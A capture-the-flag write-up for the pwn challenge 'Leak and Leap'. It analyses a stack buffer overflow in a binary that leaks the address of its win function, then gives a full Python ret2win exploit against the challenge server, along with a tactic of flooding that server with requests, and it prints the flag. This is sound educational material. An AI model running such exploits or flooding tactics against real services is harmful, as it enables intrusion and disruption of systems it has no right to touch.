# Leak and Leap - Detailed Writeup

## Challenge Description
**Challenge**: Leak and Leap
**Category**: Pwn
**Objective**: Exploit a vulnerability in the provided binary to read the flag from the remote server.

## 1. Initial Reconnaissance

We started by analyzing the provided binary `leakandleap`.

### File Analysis
```bash
$ file leakandleap
leakandleap: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, ...
```
It's a 64-bit ELF executable.

### Security Protections (`checksec`)
```bash
$ checksec --file=leakandleap
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
**Key Observations:**
*   **PIE Enabled**: Address randomization is on, so we don't know the base address of the binary. We need a leak.
*   **No Canary**: We can overflow the stack without worrying about a stack canary.
*   **NX Enabled**: We cannot execute shellcode on the stack; we must use ROP (Return-Oriented Programming).

## 2. Static Analysis

Disassembling the binary revealed a menu-driven application (`client_thread`) with two interesting command handlers:

1.  **Command 7 (`handle_leak`)**:
    This function was clearly designed to help us. It constructs a string using `snprintf` with `%p`, which prints a pointer address.
    ```asm
    lea rdx, [rip+0xfffffffffffffe36] ; Address of 'win' function
    ...
    call snprintf ; Formats the string with the address
    call send_all ; Sends it to the user
    ```
    It explicitly leaks the address of the `win` function! This allows us to calculate the binary's base address and bypass PIE.

2.  **Command 1 (`handle_echo`)**:
    This function reads a length, then reads that many bytes into a buffer.
    Crucially, it calls `log_bad_request` if the length constraint check passes (or fails in a specific way).
    The vulnerability lies in `log_bad_request`:
    ```asm
    <log_bad_request>:
    ...
    lea rax, [rbp-0x100]      ; Destination buffer (size 256)
    ...
    mov rdx, 0x2bc            ; Count (700 bytes!)
    call memcpy               ; VULNERABILITY: Stack Buffer Overflow
    ```
    It copies 700 bytes into a 256-byte stack buffer. This is a classic buffer overflow.

## 3. The Plan

1.  **Leak the Address**: Send Command 7 to get the address of the `win` function.
2.  **Calculate Base**: Use the leaked address to calculate the PIE base (though we can just jump directly to the leaked `win` address).
3.  **Overwrite Return Address**: Use Command 1 to trigger the overflow in `log_bad_request`.
    *   **Padding**: Fill the 256-byte buffer + 8 bytes for the saved RBP (`264` bytes total).
    *   **ROP Chain**: Overwrite the return address with the address of `win`.
4.  **Win**: The `win` function (`0x13c7`) opens and sends `flag.txt`.

## 4. Exploitation & Network Challenges

The theoretical exploit was straightforward, but the remote server (`pwn.ideh.cloud:9003`) proved difficult.

### The Network Issue
Connection attempts were unstable. The server often reset the connection (`RST`) or timed out when sending the "Leak" command. This suggested:
*   Aggressive timeouts or rate limiting.
*   Output buffering issues where the "Leak" response wasn't being flushed to the network immediately.

### The Solution: "Flooding"
To overcome this, we modified the exploit to **flood** the server with multiple Leak commands (`\x07\x00\x00\x00` * 20).
*   This filled the server's input/output buffers, forcing it to process the request and flush the response.
*   We then read from the socket in a loop until we found the "LEAK" signature.

### Stack Alignment
We also encountered crashes locally when jumping to `win`. This is often due to the System V AMD64 ABI requiring the stack to be 16-byte aligned before calling functions like `fopen` (used in `win`).
*   **Fix**: We added a simple `ret` gadget (`pop rip` effectively) before the `win` address. This shifts the stack by 8 bytes, restoring alignment.

## 5. Final Exploit Script

```python
import socket
import struct
import time
import sys
import re

TARGET_IP = "pwn.ideh.cloud"
TARGET_PORT = 9003

def p32(x): return struct.pack("<I", x)
def p64(x): return struct.pack("<Q", x)

def solve():
    print(f"[*] Connecting to {TARGET_IP}:{TARGET_PORT}")
    s = socket.create_connection((TARGET_IP, TARGET_PORT), timeout=10)
    time.sleep(1)

    # 1. FLOOD LEAK COMMANDS
    print("[*] Flooding Command 7 (Leak)...")
    s.sendall(p32(7) * 20)

    # 2. CAPTURE LEAK
    leak_data_raw = b""
    start_t = time.time()
    while time.time() - start_t < 5:
        try:
            chunk = s.recv(1024)
            if not chunk: break
            leak_data_raw += chunk
            if b"LEAK" in leak_data_raw: break
        except socket.timeout: pass
    
    # Extract address
    leak_match = re.search(r"LEAK (0x[0-9a-f]+)", leak_data_raw.decode(errors='ignore'))
    if not leak_match:
        print("[!] No leak found")
        return
        
    win_addr = int(leak_match.group(1), 16)
    print(f"[*] Win Address: {hex(win_addr)}")

    # Calculate Ret Gadget (Base + Offset)
    # Win is at offset 0x13c7. Ret is at 0x1016.
    base_addr = win_addr - 0x13c7
    ret_gadget = base_addr + 0x1016 # generic 'ret' instruction
    
    # 3. SEND EXPLOIT PAYLOAD
    print("[*] Sending Command 1 (Echo)...")
    s.sendall(p32(1))
    
    payload_len = 300
    s.sendall(p32(payload_len))
    
    # Padding (256 buffer + 8 rbp) + RET (align) + WIN
    payload = b"A" * 264 + p64(ret_gadget) + p64(win_addr)
    payload += b"C" * (payload_len - len(payload)) # Fulfill length
    
    s.sendall(payload)

    # 4. GET FLAG
    print("[*] Waiting for flag...")
    time.sleep(1)
    print(s.recv(4096).decode(errors='ignore'))
    s.close()

if __name__ == "__main__":
    solve()
```

## 6. Flag
`IDEH{g00d_l3ap_nd_le4k}`
